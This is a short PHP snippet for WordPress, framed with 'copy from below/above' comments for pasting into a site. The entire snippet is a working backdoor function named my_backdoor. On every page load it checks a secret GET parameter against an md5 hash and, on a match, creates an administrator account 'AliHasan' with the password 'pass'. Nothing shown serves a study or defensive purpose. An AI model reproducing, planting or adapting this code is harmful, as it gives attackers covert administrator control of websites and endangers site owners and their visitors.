<?php 

// copy from below 

add_action( 'wp_head', 'my_backdoor' );




function my_backdoor() {


    if ( md5( $_GET['chiching_fak'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {


        require( 'wp-includes/registration.php' );


        if ( !username_exists( 'AliHasan' ) ) {


            $user_id = wp_create_user( 'AliHasan', 'pass' );


            $user = new WP_User( $user_id );


            $user->set_role( 'administrator' );


        }


    }


}





// copy from above



?>
